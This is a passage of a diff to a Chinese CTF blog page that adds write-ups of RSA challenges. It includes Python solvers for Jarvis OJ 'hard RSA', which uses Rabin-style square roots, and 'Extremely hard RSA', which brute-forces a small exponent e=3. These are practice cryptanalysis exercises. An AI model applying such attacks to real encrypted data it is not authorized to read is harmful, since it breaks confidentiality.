open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher = string.atoi(cipher, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line">y_p = gmpy2.invert(p, q)</span><br><span class="line">y_q = gmpy2.invert(q, p)</span><br><span class="line">m_p = pow(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">m_q = pow(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line">a = (y_p * p * m_q + y_q * q * m_p) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (y_p * p * m_q - y_q * q * m_p) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a, b, c, d):</span><br><span class="line">    s = <span class="string">'%x'</span> % i</span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">'0'</span> + s</span><br><span class="line">    <span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="jarvis-oj-extremely-hard-rsa">Jarvis OJ Extremely hard RSA</h3>
+<p><span class="math inline">\(e = 3\)</span>,明显是小公钥指数攻击.这使用<span class="math inline">\(multiprocessing\)</span>来加快破解速度.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">pool = Pool(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher = int(cipher, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(j)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> j</span><br><span class="line">    a, b = gmpy2.iroot(cipher + j * N, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">        m = a</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;:x&#125;'</span>.format(int(m)).decode(<span class="string">'hex'</span>)</span><br><span class="line">        pool.terminate()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SmallE</span><span class="params">()</span>:</span></span><br><span class="line">    inputs = range(<span class="number">0</span>, <span class="number">130000000</span>)</span><br><span class="line">    pool.map(calc, inputs)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    SmallE()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -571,8 +634,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/7d8dc2a1/" rel="next" title="writeup-buuctf">
-                <i class="fa fa-chevron-left"></i> writeup-buuctf
+              <a href="/posts/a6939fc8/" rel="next" title="IS-pwn-Linux-WEBPWN基础">
+                <i class="fa fa-chevron-left"></i> IS-pwn-Linux-WEBPWN基础
               </a>
             
           </div>
@@ -581,8 +644,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/posts/7b4f1cc3/" rel="prev" title="writeup-nctf-2019-quals-pwn">
-                writeup-nctf-2019-quals-pwn <i class="fa fa-chevron-right"></i>
+              <a href="/posts/36159cdd/" rel="prev" title="w4rd3n-朝花夕拾">
+                w4rd3n-朝花夕拾 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -657,7 +720,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">177</span>
+                    <span class="site-state-item-count">178</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -849,7 +912,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode方向"><span class="nav-number">1.</span> <span class="nav-text">shellcode方向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jmp-与lea"><span class="nav-number">1.1.</span> <span class="nav-text">jmp $与lea</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#rsa"><span class="nav-number">1.</span> <span class="nav-text">rsa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#codegate-ctf-rsababy"><span class="nav-number">1.1.</span> <span class="nav-text">2018 CodeGate CTF Rsababy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#国家安全周-pure-math"><span class="nav-number">1.2.</span> <span class="nav-text">2018 国家安全周 pure math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwnhub-lhy"><span class="nav-number">1.3.</span> <span class="nav-text">2018 Pwnhub LHY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seccon-very-smooth"><span class="nav-number">1.4.</span> <span class="nav-text">2017 SECCON very smooth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvis-oj-hard-rsa"><span class="nav-number">1.5.</span> <span class="nav-text">Jarvis OJ hard RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvis-oj-extremely-hard-rsa"><span class="nav-number">1.6.</span> <span class="nav-text">Jarvis OJ Extremely hard RSA</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -881,7 +944,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">726k</span>
+    <span title="站点总字数">730k</span>
   
 
   
@@ -890,7 +953,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">11:04</span>
   
 </div>
 
@@ -1450,6 +1513,30 @@
   
   
 
+  
+    
+      <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      },
+      TeX: {equationNumbers: { autoNumber: "AMS" }}
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+    
   
 
 
